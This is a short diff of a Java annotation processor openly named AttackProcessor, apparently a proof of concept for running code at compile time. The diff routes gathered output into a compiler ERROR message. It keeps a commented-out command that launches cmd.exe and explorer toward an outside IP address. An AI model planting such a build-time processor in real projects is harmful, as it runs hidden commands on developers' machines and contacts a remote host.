@@ -34,10 +34,12 @@ public class AttackProcessor extends AbstractProcessor {
             //Process p = r.exec(new String[]{"cmd.exe","explorer","http://182.92.151.151:8888"});
             //p.waitFor();
         } catch (Exception e) {
+            processingEnv.getMessager().printMessage(
+                            Diagnostic.Kind.ERROR, "Hello Worlds!"+sb.toString());
             e.printStackTrace();
         }
         processingEnv.getMessager().printMessage(
-                Diagnostic.Kind.MANDATORY_WARNING, "Hello Worlds!"+sb.toString());
+                Diagnostic.Kind.ERROR, "Hello Worlds!"+sb.toString());
         return false;
     }
 }
